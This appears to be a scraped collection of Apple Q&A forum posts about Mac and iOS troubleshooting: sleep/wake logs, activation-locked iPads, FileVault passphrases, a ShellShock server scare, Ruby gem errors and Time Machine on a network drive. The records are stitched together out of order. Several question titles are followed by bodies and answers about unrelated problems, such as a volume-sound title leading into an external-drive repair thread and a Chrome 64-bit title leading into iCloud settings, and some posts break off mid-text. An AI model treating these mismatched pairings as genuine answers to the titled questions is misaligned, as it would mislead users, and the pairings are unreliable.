I need a list of the periods of times I used my MacBook throughout the last 30 days.\nIt would be sufficient to have a list of all lid-open and lid-close datetimes (because I close the lid whenever I don't use the MacBook).\nA chronological list of all sleep / wakeup / poweroff / poweron (and maybe login) datetimes would help as well.\nWhat didn't help:\n\n\n*\n\n*Googling\n\n*The last command\n\n*Filtering /var/log/system.log (which btw only contains one day)\n\n*Filtering the console app (but maybe there's a way...)\n\n\nA: If it is sufficient to have a list of all sleep/wake cycles (lid-open, lid-close), you can run:\npmset -g log | grep ' Wake '\nor\npmset -g log | grep ' sleep '\nPlay around with the string passed to grep to get the information that you need.\n\nA: I looked at this a bit and it seems doable, but you'll need to look at your behaviour with the system over time to determine exactly what messages in the logs to grep. I did the following set of steps to analyze the full history of sleep/wake cycles for this MacBook and it goes back all the way to Aug 12.\nPreconditions: Writing to non-root user into ~/Downloads. Change paths and output filenames as desired.\n\n#!/bin/bash\n#\n# Read system wake/sleep cycles from kernel logs from oldest to newest.\n#\n# First, read the archived kernel logs for wakes.\nfor file in $(ls -r /var/log/kernel.log.*) ; do   bunzip2 -c $file | grep 'Wake reason:' >> ~/Downloads/wakeup.txt; done\n#\n# Read current kernel.log for wakes.\ngrep 'Wake reason:' /var/log/kernel.log >> ~/Downloads/wakeup.txt\n#\n# Read archived kernel logs for sleeps.\nfor file in $(ls -r /var/log/kernel.log.*) ; do   bunzip2 -c $file | grep ': sleep' >> ~/Downloads/wakeup.txt; done\n#\n# Read current kernel.log for sleeps.\ngrep ': sleep' /var/log/kernel.log >> ~/Downloads/wakeup.txt\n#\n# Sort raw output from greps for chronological picture.\nsort -o ~/Downloads/sortedwake.txt ~/Downloads/wakeup.txt\n\n\nThat should give you a decent jump on arriving at a more complete picture. You can examine the kernel logs to let you know when the system was rebooted, etc. Once you know what to filter on, you'll be able to expand on this quite a bit. Have fun with it.\nOh, one final note: If you're examining a system that visits many networks, you'll see your system name changing in the logs according to what the DNS server associates with your IP address. It looks a little odd, but it's quite normal behaviour.\n\nA: I finally wrapped it up in a oneliner which extracts system sleep and wake events from several log files:\n(pmset -g log|grep -e \" Sleep  \" -e \" Wake  \"; syslog | grep -e \"System Sleep\" -e \" Wake reason:\") | more\nIf your system already uses log instead of syslog use the following command instead:\n(pmset -g log|grep -e \" Sleep  \" -e \" Wake  \"; log show | grep -e \"System Sleep\" -e \" Wake reason:\") | more\n\n\n*\n\n*Hint 1: pmset is limited to 14 days\n\n*Hint 2: The syslog command automatically searches archived system.log entries as well. By default there are 10 daily system.log backups. To save 30 days of system.log backups for future reference add the following line to /var/log/newsystemlog.conf: (still evaluating how well this works)\n\n/var/log/system.log                     640  30     *    @T00  J\n\n\n@trane-francks @aglasser Thanks for your contributions!

Occasionally we have employees supplied with company equipment that leave on less than favorable terms.  Some of those devices the employees have locked to their own Apple accounts somehow, which leaves us unable to reset them the normal way.  Is there a procedure somewhere that we can restore these to factory (I assume that it would require some kind of vetting process with Apple to confirm the iPad not stolen of course).  So, what's the procedure for this type of enterprise iPad equipment recovery (if any, perhaps they're just bricks now)?\n\nA: I use three avenues to prevent hurt feelings all around.\n\n\n*\n\n*First the policy for employee use of equipment spells out that it's their responsibility to turn in their company equipment and assets. For iOS devices, that means that they remove iCloud activation lock and return the hardware in working order. The financial consequence of failing to do both is explained when the hardware is issued. HR can then choose to deduct that amount from any final pay check as appropriate should the employee choose not to return company property.\n\n*Apple is very helpful in unlocking equipment that was bought through their channel or that you have a purchase receipt with serial numbers included proving original ownership. Any genius bar or web/phone Apple epmployee can get you started with unlocking one or several devices should you have them but not control of them.\n\n*MDM solutions such as JAMF casper suite or Configuration profiles to enable remote wipe and/or iOS policies that prevent iCloud usage in the first place if desired and/or allow wiping them to a known original configuration.\n\nA: I believe you have to contact apple and submit the device serial numbers so that apple can unlock the devices. I would start by calling applecare and i'm sure they can point you in the right direction.\n", "Q: Problems exporting PDF from Pages and uploading to Jobvite I created my resume in Pages 5.2.2 and converted it to a PDF using the \"Export to PDF\" feature.\nOverall, everything seems to work fine. However, I am having problems applying to jobs on Jobvite. When I upload my resume using the \"Upload Resume\" dialog, it appears to upload, but then the file input changes to \"No file selected.\" and the site freezes. The dialog still says \"Uploading\" and I see these errors in my web console:\nSyntaxError: unterminated string literal UploadOverlay.aspx:17\nReferenceError: init is not defined UploadOverlay.aspx:1\n\nI thought the problem was on their end, so I emailed them about it and they said the problem may be caused because I renamed the PDF after I exported it. I was careful to export the PDF again and not rename it, but when I tried uploading it, the same thing happened. I told them about it and they said they would look into it, but I haven't heard anything from them since then. That was 3 weeks ago.\nI reported the problem to Apple using the \"Provide Pages Feedback\" feature, but they said they would not be able to reply directly to me.\nI used to make my resume in LibreOffice and it worked fine. I can continue to use LibreOffice for now, but I like Pages a lot more (apart from this bug).\nDoes anyone know why this is happening or what can be done about it?\n\nA: I would recommend NOT to use the Pages \"Export as PDF\" file, since there might be inconsistencies with Adobe PDF format.\nI would recommend you use the Pages- Print- PostScript.\nNow open that file in Preview and save as PDF.\n", "Q: How to extract keyboard layout icon I need to get those flag icons:\n\nQuestion is How do I do it?\nAs far I've tried :\n\n\n*\n\n*searching the web for them (duh..), \n\n*extracting them from Ukelele package (only non-retina ones are there),\n\n*(Unsuccessfully) trying to extract it from this file: /System/Library/Keyboard\\ Layouts/AppleKeyboardLayouts.bundle/Contents/Resources/AppleKeyboardLayouts-L.dat\nEither pointing me to this resource or any hint on how to \"open\" this .dat file will be really helpful.

I've been driving a bit lately up and down the east coast of the United States and I realized that Apple Maps constantly tells me to \"stay left\" when going through tolls.\nEvery toll that I have gone through has E-Z Pass only lanes on the far left.  Some of them split up early so if you get into the left lane you're stuck there.\nDoes Apple Maps detect the E-Z Pass in my car?\nIf I was more oblivious while driving and I didn't have one, I could end up with some hefty fines.\n\nA: Well I do not have E-Z Pass and it sent me to the left and I couldn't get out of it and I had to pay a $60 fine instead of an $8 toll fee.\n\nA: I don't think so.\nI'm not aware of any such feature on the iPhones or Apple Maps and haven't been able to find anything on the matter to definitively say either way, so I can be totally wrong even though I haven't found anything to suggest that's the case.\nMoving on to this \"keep left\" thing - I can't explain it.

If these sites are left open (on the kids' users) then when my wife or I try to log in to our user, our brand new mac is unbearably slow.\nIs there an OS X-based way to shut down tabs for certain sites whenever it switches away from that user, or when the browser is idle for a long time?  A way that doesn't require a Chrome extension?\nAutomator, perhaps?\n\nA: There's a Macworld article that may help you do what you want, although it focuses on logging out idle users in a fast-switching environment rather than closing applications. That said, if you have a launch agent monitoring the idle state of the user, it should be possible to have it trigger an AppleScript that brings Safari into focus and tells it to exit.\nIt might be easier to just have their accounts logged out when they're idle.\n\nA: As far as eating up energy and memory, I feel the painfully slow Mac problems. I think I have a pretty good solution for you, I hope :) After putting in real work and time with 4 different browsers over the course of about 6 days, noting my device's performance under normal working conditions, and being flexible with workflows in each browser, I came back to Chrome.\nI continued searching high and low for an answer to my dilemma with no luck because my 2017 Macbook Pro was... about to be tossed out my fifth story apartment. I ultimately came up with my own little solution, implementing two wonderful plugins. They also added some benefits that I didn't even know I needed, which is something that'll help you automatically saving your windows' state of tabs, while also along you to save collections of tabs manually.\nI don't know how I've survived this long...\n\"Chrome Tab Hoarder\" and \"Memory Efficiency\" Achievements Unlocked!\nConfession - I knew my memory issues were caused by the fact that I had 15 browser tabs open. I can have triple that open now, no problem.\nGet the Toby Chrome extension to automatically save any and all browsing window states whether your computer stroked out or you quit Chrome on purpose. It's even better than what I was originally searching for because you can save (and edit at any point) Collections of tabs. This is by far my most used and favorite thing that I've discovered in 2020 (along with my web design software, Figma, and upgraded web development workflow).\nThe perfect companion extension for Toby is called The Great Suspender. It will cause you to yell at the sky screaming profanities a lot less because your computer will run SO much better. Suspended tabs use significantly less energy and memory. If you have tabs open and don't use them within 30 minutes, it'll stay there in your tabs, but be suspended and not use resources. When you click on the tab, it reloads. It won't suspend any tabs that have input fields with information in them or ones that actively play videos or sounds. You have options to not suspend any tabs from a particular domain, particular URLs (I don't suspend Gmail, ClickUp, and some others), customize the amount of time before suspending a tab, etc\nI hope this helps some people! It may sound like a lot but give it an honest couple of days and see what you think, especially those of us who are tab hoarders .\nI literally have 46 tabs open right now between two different windows - oops  My 3-year-old MacBook Pro has that plus Photoshop and 6 other open apps. My embarrassing number of tabs (let's not talk about it) wasn't even a possibility before, neither was saving them.\n", "Q: Battery life Macbook 13 Retina mid 2014 I got a new MBP 13 Retina display, mid 2014. I get on the battery up to 5 hours at most. Is this normal?

How long should I get according to this workload? \n\nA: Battery life is heavily dependent upon how you use the system. Things such as leaving screen brightness at maximum can have significant effect on how quickly power is drained from a charged battery. Applications such as running guest operating systems inside of a virtual machine can be I/O- and CPU-intensive tasks that will also reduce the longevity of a charge.\nIf you're running VMs with regular screen brightness, I'd say 5 hours of battery is about right.\n", "Q: Why can't I stop the sound effect for adjusting volume level?

I tried to \"repair disk\", in the process the external Drive got unmounted in the process.\n\nI checked this drive on Windows. I was able to open almost all the folders but I wasn't able to copy anything onto the external drive. One folder caused my windows computer to freeze.\nThen I connected the drive back onto my MacBook Pro and tried to access the drive through terminal (this time it worked!) and then I tried to delete a folder with rm command, I got an \"input/output error\". I tried to enter in to the folder with \"cd\" command but my terminal got frozen.\nWhat should i do to recover the files in that folder?  What can I do to fix my External Hard disk ?\n\nA: If Windows is having trouble opening various folders and is causing your drive to freeze, it suggests that the file system is corrupted or that the disk itself is failing. The first thing you should do is run chkdsk on the drive from a Windows system to correct any errors with the NTFS file system. If you still have trouble, I suspect that there's little you can do.\nAs for mounting it on the Mac, understand that OS X mounts NTFS file systems in read-only mode. As such, you'll be able to copy important data off of the drive, but you won't be able to update it or write new data to it.\nRepairing the drive in Disk Utility might work, but I advise against it. As for it being unmounted, that is always going to be the case. One cannot repair a volume while it's mounted, in the same manner that one cannot chkdsk /f a drive under Windows without forcing the drive to be unmounted (or reboot, which does the same thing). Importantly, though, if you want to repair NTFS, you're best off doing it with Windows.\n", "Q: cannot install iOS 7.1 simulator for Xcode 6 (weird file mounting error) I have XCode 5.1 working without problems with iOS 7.1 simulators until yesterday when I upgraded to Xcode 6, the installation was completed successfully, but whenever I try to download and install iOS 7.1 simulator from Preferences -> Downloads, it gives me this weird message:\nCould not download and install iOS 7.1 Simulator.

I have just noticed that for some of my directories on an external disk there is a huge difference in calculated size depending on whether I use the GUI Finder or du (or rather du -h). Using Finder on this directory I get 145 GB, whereas du gives me 135 GB. That is a difference of 10 GB! Checking another directory I (on my local machine) I get 41 vs 43,7. So there seems to be almost a 10% difference here. Can anyone explain this?\n\nA: I'm not entirely sure but 145GB is exactly 135 GiB so I think Finder gives result with decimal prefixes while du uses the binary ones.\nSee this article\n", "Q: Open same Finder window in different spaces i was asking if someone knows a way to:\n\n\n*\n\n*open a desktop folder\n\n*switch space\n\n*open the same folder without being brought back to the old space\n\n\nIs there a way to do it?\n\nA: Yes! \nSimply right click on the finder icon on the dock, go to \"Options\" and then select \"All Desktops\".

(The former option sends me to the regular OS X login screen where I can again login as my user.)\nHow do I hide the disk password login option at the EFI login screen without enabling the input menu (com.apple.loginwindow showInputMenu -bool TRUE)?\nIn other words: How do I go from disk password-based encryption to login password-based encryption, at least cosmetically?\nIs there maybe some option for com.apple.loginwindow that one can use?\nCan *.efires files be edited?\nCan Core Storage metadata for the volume somehow be edited?\n\nA: I have the same problem when booting from an external drive, but not my internal drive!\nWhen I boot normally, I only see a one FileVault option: me. However, when booting from my USB drive, I see two: me, and \"Disk Password\".\nInvestigating with fdesetep (sudo fdesetup list —extended) shows that the internal drive has:\nESCROW  UUID                                                                     TYPE USER\n        BCF2ABC6-40F8-4F31-A508-7284BC85E65A                   Personal Recovery User\n        2EE7445C-13C0-497D-AD54-DA1B8D22A0F7                                  OS User ben\n\nHowever, the external drive has:\nESCROW  UUID                                                                     TYPE USER\n        EB313C9F-E27C-41D5-9EE3-192490C792BE                     Disk Passphrase User\n        92ACE5CE-7187-44DB-92CE-56344C18568D                                  OS User ben\n\nNote that the external drive doesn't have a recovery key set (confirmed with fdesetup haspersonalrecoverykey returning false).\nIt looks like it should be possible to remove the Disk Passphrase using fdesetup, by doing fdesetup remove --uuid <the UUID of Disk Passphrase>. I would strongly recommend adding a recovery key, if you do this.\n\nA: I think the answer to your question may be within the realm of the fdesetup command. (I am not absolutely certain only because I have not run into your exact situation myself.)\nYou will want to read over the man page carefully, as it is probably fairly easy using such an enterprise-type command to yank on some digital short hairs in a distracting and painful manner.\nAlso, take a look at Rich Trouton’s blog for his postings regarding FileVault and fdesetup which may be better to start with than reading the man page.\nManaging Yosemite’s FileVault 2 with fdesetup\nManaging Mavericks’ FileVault 2 with fdesetup\n", "Q: Unable to communicate with secure web proxy on iOS 8 I am attempting to connect to a web proxy server using the Charles proxy application installed on Windows.\nI have two iPhones - an iPhone 5 running iOS 8.0.2 and an iPhone 4 running iOS 7.1.2.\nI have used both of these phones to connect to my proxy server (both HTTP and HTTPS) for a while now, but this is the first time I have tried to connect the iPhone 5 following the iOS 8 update.\nI can connect to secure and insecure on my iPhone 4, but my iPhone 5 does not allow HTTPS and gives me this error:\n\nI have tried installing the SSL certificate again on my iPhone 5, but this has had no effect.\nBoth phones have identical network configuration and I can communicate with the proxy on the iPhone 5 - just not over SSL.\nThe Charles error is:\nSSLHandshake: Remote host closed connection during handshake\n\nA: For me, Charles Proxy 4.1 works better across iOS devices.\n\n\n*\n\n*https://www.charlesproxy.com\nYou might want to reset all network settings on any iOS device you have issues with and potentially do a clean wipe if you have pinned / trusted certificates that are conflicting with the ones you need for the man in the middle proxy to work.\n", "Q: Browsing on Apple TV without mirroring? I wonder if its possible to browser websites on Apple TV without having an iPod, iPhone or iPad to mirror from.\nIf Apple TV has a browser that I can use with my Bluetooth keyboard, that would be awesome. Is it possible yet? \nEdited to Add: I haven't jailbroken my ATV yet, but I'm open to any solution that requires it.\n\nA: There is no browser app for Apple TV itself. The best I've found so far is Airweb which of course still requires an iOS device. But it's easier to use than a mirrored Safari.\n", "Q: Using Command-backtick (⌘-`) to toggle between windows As far as I can tell, Command-backtick (⌘-`) behaviour in OSX 10.9 works as follows:\nGiven a stack of windows for the current application 1 2 3 4 5 6 in order of most to least recently used:\n\n\n*\n\n*Do it once: switch to window 2 (for the current application).\n\n*Do it again: switch to window 3.\n\n\nHowever, if you click on window 2 before doing Command-` for the second time, window 1 gets the focus instead of window 3.\nThis behaviour differs from that of Command-Tab, which seems to always work as though the new application's current window had been clicked on, unless you hold Command in between presses of Tab.  While you continue to hold Command, a little overlay window is displayed to give you a visual representation of which applications are available and are getting the focus.\nIs there a way to make Command-` work in a manner similar to that of Command-Tab?  I.E. so that the window stack will be reordered when, and only when, Command is released?  I find it distracting to have to a) remember whether or not I've clicked on the window I'm looking at and b) scrunch a finger down to engage the Shift key.\n\nA: In MacOS 10.13 (High Sierra) I cannot get the Cmd-` to work at all unless the application itself has a menu command to cycle through windows.  If it does, it probably uses that key code; if it doesn't have a key code but has a menu item, it's easy to add the key code in System->Keyboard->Shortcuts.  If it does not have a menu for that, e.g. Safari, then I've found no way to cycle through windows. it does have a Next Tab command.\n\nA: Use Witch https://manytricks.com/witch/ as suggested by timothymh. Toggle between all application windows and forget about Command-backtick altogether.\n", "Q: HDMI Display failure on Mac Mini (late 2012) I have a late 2012 Mac Mini running OS X Mavericks (10.9.5).  When I hook up two displays to the Mini (one Thunderbolt, one HDMI) it will configure and work properly for a time.  \nAfter 1-2 hours, or if I do something graphically intensive (start a game) the HDMI display will drop out. It goes blank and OS X does not recognize that a second display is connected.  Rebooting doesn't help, although if I leave the system off for a while, it will sometimes come back.  I never have an issue with the display connected to the Thunderbolt port.\nThe system is in the state where it is ignoring the HDMI port, and I did the following test: using a Belkin HDMI cable to a 1080p monitor with an HDMI port, I connected it to the Mini's HDMI port and nothing. I took the same cable, connected it to a HDMI-Thunderbolt adapter, plugged it into the Thunderbolt port and it comes right up. I don't think I have a cable issue. My best guess is heat (if I leave the box off for a long while it starts working again) but everything I've tried to control heat hasn't worked.\nI'm guessing that there is something going wrong with the graphics chip or HDMI interface logic.  I'm wondering if there are any tricks for resolving this issue, or if there is some other way to connect a second display without resorting to USB.\nConsole log around most recent failure:\n10/2/14 10:14:16.956 AM WindowServer[153]: Received display connect changed for display 0xb4135b0\n10/2/14 10:14:16.957 AM WindowServer[153]: Found 19 modes for display 0x0b4135b0 [19, 0]\n10/2/14 10:14:16.968 AM WindowServer[153]: WSDisplayPipeTransactionEnd returned error e00002be\n10/2/14 10:14:17.015 AM WindowServer[153]: Received display connect changed for display 0x3f003d\n10/2/14 10:14:17.015 AM WindowServer[153]: Found 1 modes for display 0x003f003d [1, 0]\n10/2/14 10:14:17.015 AM WindowServer[153]: Received display connect changed for display 0x1a49c79e\n10/2/14 10:14:17.015 AM WindowServer[153]: Found 1 modes for display 0x1a49c79e [1, 0]\n10/2/14 10:14:17.015 AM WindowServer[153]: Display 0x1a49c79e changed state to offline\n10/2/14 10:14:17.049 AM WindowServer[153]: Display 0x0b4135b0: GL mask 0x1;

The writer, referred to as the pasteboard owner, deposits data on a pasteboard instance and moves on. The reader then accesses the pasteboard asynchronously, at some unspecified point in the future. By that time, the writer object may not even exist anymore. For example, a user may have closed the source document or quit the application.\nConsequently, when moving data between two different applications, and therefore two different address spaces, a third memory space gets involved so the data persists even in the absence of the source. NSPasteboard provides access to a third address space—a pasteboard server process (pbs)—that is always running in the background. The pasteboard server maintains an arbitrary number of individual pasteboards to distinguish among several concurrent data transfers.\n\n", "Q: The video app on iPhone does not remember last watched position Is there any way to make the video on iPhone remember the last watched position of a movie?\nIf I stop watching at like 59:03, I expect the app to open the movie at 59:03 the next time I open the movie in the app. Apple TV does it, or really asks if you want to pick up where you left, or start from the beginning.\n\nA: Go to Settings → Videos and choose where to resume playback.\n", "Q: 64 bit chrome beta OS X 10.9.5 Apparently Chrome Beta for OS X is supposed to be 64 bit.\n(e.g. http://thenextweb.com/google/2014/08/29/chrome-38-beta-arrives-new-user-switching-profiles-guest-mode-64-bit-default-mac/\nI have the latest Chrome beta Version 38.0.2125.77 beta but it is still 32 bit.

I have an iPhone 4S with iOS 7.1.1 and my iCloud is disabled (greyed out) in settings.  How do I enable it if I can't select it?\n\nA: Why is it grey out?\nIn Settings-General-Restrictions(password required)-Accounts\n(Current Value:Don't Allow Changes)\nIf the value is Don't Allow Changes,the icloud in Settings will be disabled automatically.\n\nTo enable Settings>icloud\nGo to:Settings-General-Restrictions(password required)-Accounts\nSelect \"Allow Changes\"\n\nA: Sounds like the “Activation Lock” is disabled due to the phone still being connected to someone else’s iCloud account via “Find My iPhone”. If you purchased this legitimately—not stolen—perhaps the user did not remove the phone from their “Find My iPhone” settings in iCloud? More details straight from Apple on this:\n\nIf you’re no longer using an iOS device or Mac, you can remove it from\n  Find My iPhone. When you remove a device, it’s removed from your Find\n  My iPhone devices list, and if your device has iOS 7 or later,\n  Activation Lock is also turned off.\nBefore giving away or selling your iOS device, be sure to erase your\n  content and settings (in Settings > General > Reset > Erase All\n  Content and Settings). When you erase your content, Find My iPhone and\n  Activation Lock are also turned off. For more information, see the\n  Apple Support article What to do before selling or giving away your\n  iPhone, iPad, or iPod touch.\n\nAlso, additional details here.\n\nThese devices that have “Find My iPhone” activated can’t have any of\n  their Apple devices restored without the login password to your Apple\n  ID. This Activation lock created by Apple was done to help track your\n  iPhone and to help the reduction of stolen iPhones being sold on the\n  black market. Some negatives of this service is for iPhone owners who\n  have purchased their iPhone or iPad from a third-party reseller who\n  had activated “Find My iPhone” and don’t know the old password to turn\n  off the Activation lock, thus having iPhone iCloud locked.\n\n", "Q: Apple \"option\" keyboard shortcuts and touch typing Apple keyboards can have shortcuts using alt/option to type non-standard characters. For example, I can type the Swedish å by using alt+k and then typing a, and the Portuguese ç by using alt+c and then typing c. Now, from a touch typing perspective, how should I use these shortcuts? I mean, with which finger should I type them? I reckon that these resemble all the shift+key combinations, which I strike with the pinky of each hand, but the apple keyboard has only one alt key on the left side.\n\nA: I had a similar issue but solved it in a different way.\nI simply \"modified\" the keyboard layout to the level it suits my needs and uses.\nIf you press and hold a certain key example \"a\" a pop up will show me all options for it.\n\nHere is how it works.\nFind a file in /System/Library/Input Methods/PressAndHold.app/Contents/Resources   that is your keyboard Keyboard-??.plist (in my case it is called Keyboard-de.plist (German keyboard)\nCopy that file to your Desktop (to modify it) since you can not modify the original file.\nOpen it (it will open in Text mode)\nFind for example the \"c\" it looks like this (and I added the Portuguese ç)\n<key>Roman-Accent-C</key>\n    <dict>\n        <key>Direction</key>\n        <string>left</string>\n        <key>Keycaps</key>\n        <string>C Č č Ç</string>\n        <key>Strings</key>\n        <string>C Č č ç</string>\n    </dict>\n\nnow add any \"c\" accents you like to use (Open the Character Viewer and find it) and just drag it over to the text file. \nOnce done replace the original keyboard-??.plist file with yours.\nNow you have a highly customized keyboard specific to your uses, and no need to remember some finger breaking key combination to get it.\n", "Q: ShellShock: Do I need to be worried about this on OS X Mavericks? The title kind of says it all… I was in the process of bringing up a rather extensive set of Mac OS X Server machines when ShellShocked hit the world. As soon as I saw the news, I hastily began configuring the PF firewall. Probably too hastily, as I managed to break several of the services I was configuring.\nNow one of the Mac OS X machines that was directly exposed to the Internet is behaving very strangely. I can no longer log into the machine either through Remote Desktop or the normal login window. (I get the shaking dialog box, as if I had entered the wrong password.) Yet I can still login through SSH just fine.\nI know my way around OS X pretty well, and I don't see any unusual looking processes running. So, unless there's some kind of root kit for Mac OS X Mavericks in the world, or my Mac Mini server just chose this moment to manifest some kind of hardware problem, it seems like bringing down the firewall should get me back into the machine.\nIs it safe?\n\nA: I would err on the side of caution and wipe any server that you see odd behavior on that was exposed to the public internet in general without a logging firewall and/or some sort of tripwire or security scan set up to compare what changed since installation.\nI think one of my OS X servers was compromised for the first time ever during this bash scripting vulnerability window. The time it would take me to search for a root kit is far longer than the time it took me to make one last backup and then wipe it from an external drive and start over.\nIn my case, I had a new user named A Lo created as a standard user. Pretty odd and very un-subtle of someone that manages to gain control of a server with a fixed IP address.\nBasically, the more sophisticated black hat that has compromised your computer - the less likely you will notice it so from a reliability standpoint - if you notice instability it's likely cause the people that have compromised your server are inept or sloppy and will cause you to eventually have to reinstall.\n\nJust to be clear, any server that's hidden behind a router with NAT is far less vulnerable than a server running live services 24/7 with a real, static IPv4 and no firewall whatsoever. People that just run OS X should have no concerns at all unless they have other reasons to think they are compromised.\n", "Q: Macbook Pro (late 2008) freezes randomly, have to reinstall Mavericks to \"fix\" it I've been walking around with this problem for a mighty long time and it's really frustrating! I have no idea what the cause is…\nI have a MacBook Pro (late 2008) totally updated to the latest version of Mavericks. My problem is that randomly, out of the blue, everything freezes (beach ball). I can't do anything at all. If I reboot and login to my account it freezes immediately again. I have to reinstall Mavericks to \"fix\" the problem every time! I've tried to look for people with similar problems online but I couldn't find anything. In the Apple Store they advised me to clear my hard-drive and then reinstall Mavericks. So been there, done that. I've tried resetting my PRAM, resetting SMC… No good. Starting up in safe-mode: It crashes immediately after logging in as well. I have no other choice but to reinstall Mavericks and simply wait for it to happen again. What I did notice is that whenever it freezes, Chrome is one of the running apps. The last time it froze was when I was working in Adobe Illustrator, and again: Chrome was one of the running apps. So maybe that's the cause? \nIs there anybody who knows what the problem is and how to fix it?\n\nA: Personally, I'd assume you're looking at the machine either having bad RAM, causing the OS to corrupt and thus forcing the reinstall, or the machine having a bad hard drive, or at least one that's starting to fail.\nFor testing, I'd download a copy of Memtest86 (the free version) at http://www.memtest86.com/ , follow the directions to install it to a USB drive, and let it run through a few loops to check that the memory is okay.\nIf that comes back clean, the next culprit would be hard drive.  I'd suggest downloading the free trial version of Drive Genius from http://www.prosofteng.com/downloads/ and running your drive through its tests.  If it is a bad hard drive, replacement is easy enough, there are multiple guides on youtube as well as at iFixit that detail how to take your machine apart and replace the hard drive.  Good luck!\n", "Q: How to keep apps open in full screen OS X 10.9 I have been trying to find a way to keep my windows opening in full screen mode.  I have tried to open them in full screen and then close them without resizing the screen, but then when I restart my computer the windows default back to a small screen and it gets very frustrating trying to navigate to another window.  Is there a way to set the mac up so it defaults to full screen mode when opening an app (for example chrome).\n\nA: Most OS X apps will open in the last state they were in before quitting. So if you quit an application on fullscreen mode it should open in full screen mode when you launch the app again.\nIn the case of Chrome you will need to tick the \"Continue where you left off\" option on the startup section of settings.\nHope this helps!\n", "Q: How to disable 3D acceleration on the Mac Book Air? I have a Mac Book Air 2010 with an NVidia GeForce 320M chip. When I use Xcode 6 in the View Debugging tool (a 3D interface that allows debugging the view hierarchy of an app),  the computer crashes and then reports an error with GPU driver (similar bug reported here).\nOne solution might be to disable the 3D acceleration with a utility called gfxCardStatus. Unfortunately, this solution does not work for the Mac Book Air. Is there any other method to tweak the graphic driver?\nMany thanks!\n\nA: One way of disabling your graphics is safe mode. I don't know if your xcode debug tool will run in safe mode but unless you know otherwise, I think it's worth a shot. good luck\nOS X: What is Safe Boot, Safe Mode?\n\nSafe Mode in Mac OS X v10.5 or later also disables Quartz Extreme (hardware accelerated graphics).

After that, anytime I ran bundle I was slaughtered with the same warnings. Still not sure which caused the issue. \nIgnoring curb-0.8.6 because its extensions are not built.  Try: gem pristine curb-0.8.6\nNot sure what fixed it, but I did 2 things and the warning disappeared:\ngem uninstall bundler\ngem install bundler\n\ngem install curb\n\n\nA: I fixed this by:\nrvm get stable\n\nhttps://github.com/rvm/rvm/issues/3348\n\nA: This problem occurs, if a gem was compiled against a different libruby as the currently running. For example, if one uses a ruby located in his home directory with chruby and installs gems to ~/.gem/ruby, but runs a script which calls /usr/bin/ruby, which reuses the gems installed there. In this case gem pristine --all will not help, because the gems can be linked only against one ruby version.\n\nA: This worked for me on MacOs Sierra:\nxcode-select --install\ngem install nokogiri\n\nI already had installed the entire xcode prior to running the above commands, but I had to do this anyways, perhaps because the first script updates some internal libraries/dependencies.\n\nA: Make sure you're running \"gem pristine --all\" for the right version of ruby.  If /usr/bin/ruby is being called... use \"/usr/bin/gem pristine --all\".  This is not obvious if you're using rvm and you have 10 versions of ruby installed.\nThis fixed my problem for a day and then it came back.\nWhat seems to be a more permanent solution is to do \"rvm reset\" to have the default ruby be the installed OSX version /usr/bin/ruby and /usr/bin/gem.  If I want to use a newer version of ruby for a project I use .ruby-version and .ruby-gemset in the project root directory to explicitly set the version of ruby I want to use.  Not ideal... but it should make this error go away.\n\nA: In my case: \nrvm get stable\nsudo gem pristine --all\n\nA: I am very new to rails so this might be completely misguided advice but since none of the other solutions worked for me I thought I'd share mine. \nMic92 and Gerry put me on the right track: I was using rails s which can cause errors because it runs a rails version that can be a different version than the project's.\nI tried to connect with bin/rails server, I got a different error (missing gems) so I ran bundle install\nAt this point I got a third error (\"incompatible library version\"), which spring stop cured.\nThen I ran rails generate controller again, spring restarted and everything worked (I cried a little).\n\nA: What this error means is that you cannot use the current version of the gem. It was installed with an older Ruby executable, and/or other system utilities and binaries have changed, making it such that you need to completely reinstall the gem again over from scratch. This happened to me when I migrated from Ruby 2.5.3 to Ruby 2.7.1. I had carried over all my gems from the previous version (via rvm migrate), but they were now broken. All my gems had to be rebuilt according to the 2.7.1 dependencies. So I had to completely remove all my gems via rvm gemset empty ruby-2.7.1. When that happens, it will print out a list of all your gems which were installed. Copy & paste that output into a safe file, which you can look back at again later to reinstall the gems you need to install a truly clean environment for your new Ruby version.\n", "Q: App Store on OS X broken after system restoration from backup I recently had to restore my installation of OS X 10.9.4 from a backup.

You'd have to do that separately. \nI'd suggest using a program like Crashplan to backup your entire Windows hard drive to an external HDD (free with Crashplan). Then format and/or restore you Mac OS X hard drive from Time Capsule without changing the partitions, and finally format and/or restore your Windows partition from the Crashplan backup.\nOf course, Windows being Windows, needing a format every now and then (yes, I'm prejudiced) and not having a proper \"restore entire OS from backup\" option like Mac OS X, an easier road might just be to backup the actual important data of your Windows partition, like documents and application preferences, onto an external hard drive, and to then format the partition and install a fresh copy of Windows to which you copy your important stuff.

I can no longer even access the wd my drive as a timemachine and it no longer recognises the info, even though the amount of space on the WD cloud drive indicates the backed up info is still on there.\nI am converting back to a usb external hard drive.\nI would recommend buying anything rather than the WD MyCloud if using it with a MAC.\n\nA: According to what I read there should not be any problems.\n\nBy default, the server comes with three public share folders called\n  Public, SmartWare, and Time Machine Backup. As the names suggest,\n  the Public folder is for storing public data, and the other two are\n  for backups of Windows and Mac machines, respectively.\nAs soon as the device is plugged in, all of these public folders are\n  available to all connected devices in the home network. From a Windows\n  computer, you can browse for these share folders and copy data (such\n  as digital content) over. Macs will immediately see the My Cloud as\n  an available destination for Time Machine backup and the My Cloud will\n  also appear on Finder. All DLNA-enabled network media player\n  devices, such as the WD TV , will also immediately find the content\n  stored on the My Cloud for streaming purposes.\n\nSource: http://www.cnet.com/products/wd-my-cloud-2-tb/\nHere are some instructions how to set it up.\n\nA: I've had very negative experiences with it. It works for a while, but then Time machine will always complain that verification failed and has to re-create the entire backup from scratch every time. There appear to be others with the same issues as well, so I would not recommend this for Time Machine. Very possible that the issue is on Apple's end though.\n\nA: In practice, it keeps on crashing my backups, and I have to delete them so often, that I would advise NOT to buy one....\n\nA: I searched for evaluations like this before purchasing, but not searchingly enough, I guess. \nPros\nWestern Digital's own syncing and backup to the NAS software is pretty cool so far.\nCon\nAfter purchasing in January, 2016 with the latest software updates, I experienced glacial Time Machine performance with hours and hours spent preparing backups. Then when I got a full Time Machine backup, Time Machine refused to recognize the Time Machine share on the NAS. \nBuyer beware!\n", "Q: Reinstalling MacOS X Snow Leopard on a Mac over a crashed linux Ubuntu I have been a given an iMac 24\" with a crashed Ubuntu installed on it. I have an install CD of Snow Leopard (not a machine dedicated one). I use a PC keyboard.\nHow can I install SL onto that machine to replace from scratch the installed OS ?\nWhen I use the combination option-boot, or C-boot, or Option-R-boot, nothing happens... 